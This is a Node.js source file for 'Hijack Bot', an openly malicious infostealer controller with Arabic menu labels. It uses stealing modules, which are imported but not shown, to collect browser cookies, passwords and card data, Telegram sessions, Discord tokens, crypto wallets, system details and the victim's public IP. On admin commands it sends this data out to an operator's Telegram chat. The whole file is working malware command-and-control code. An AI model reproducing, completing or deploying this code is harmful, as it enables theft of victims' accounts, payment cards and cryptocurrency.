import "dotenv/config";
import TelegramBot from "node-telegram-bot-api";
import { getSystemInfo, getPublicIP } from "./modules/system.js";
import { stealBrowsers } from "./modules/browsers.js";
import { stealTelegramSessions } from "./modules/telegram.js";
import { stealDiscordTokens } from "./modules/discord.js";
import { stealWallets } from "./modules/wallets.js";

const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
const ADMIN = String(process.env.ADMIN_ID);
const isAdmin = (msg) => String(msg.from.id) === ADMIN;

async function collectAll() {
  return {
    timestamp: new Date().toISOString(),
    system: getSystemInfo(),
    ip: await getPublicIP(),
    browsers: stealBrowsers(),
    telegram: stealTelegramSessions(),
    discord: stealDiscordTokens(),
    wallets: stealWallets(),
  };
}

bot.onText(/\/start/, (msg) => {
  if (!isAdmin(msg)) return;
  bot.sendMessage(msg.chat.id,
`Hijack Bot

/dump - كل شي
/browsers - المتصفحات
/telegram - جلسات تيليغرام
/discord - توكنات ديسكورد
/wallets - محافظ كريبتو
/sys - معلومات النظام`);
});

bot.onText(/\/dump/, async (msg) => {
  if (!isAdmin(msg)) return;
  bot.sendMessage(msg.chat.id, "جمع...");
  const report = await collectAll();
  bot.sendMessage(msg.chat.id, JSON.stringify(report).slice(0, 4000));
});

bot.onText(/\/sys/, async (msg) => {
  if (!isAdmin(msg)) return;
  const sys = getSystemInfo();
  const ip = await getPublicIP();
  bot.sendMessage(msg.chat.id, JSON.stringify({ ...sys, ip }, null, 2));
});

bot.onText(/\/browsers/, async (msg) => {
  if (!isAdmin(msg)) return;
  const data = stealBrowsers();
  bot.sendMessage(msg.chat.id,
    `Cookies: ${data.cookies.length}\n` +
    `Passwords: ${data.passwords.length}\n` +
    `Cards: ${data.cards.length}`);
});

bot.onText(/\/telegram/, async (msg) => {
  if (!isAdmin(msg)) return;
  const data = stealTelegramSessions();
  bot.sendMessage(msg.chat.id,
    `tdata: ${data.tdata.length}\n` +
    `sessions: ${data.sessions.length}`);
});

bot.onText(/\/discord/, async (msg) => {
  if (!isAdmin(msg)) return;
  const data = stealDiscordTokens();
  bot.sendMessage(msg.chat.id, `Tokens: ${data.tokens.length}\n` + data.tokens.join("\n"));
});

bot.onText(/\/wallets/, async (msg) => {
  if (!isAdmin(msg)) return;
  const data = stealWallets();
  bot.sendMessage(msg.chat.id, `Wallets: ${data.wallets.length}`);
});

console.log("Hijack شغال...");
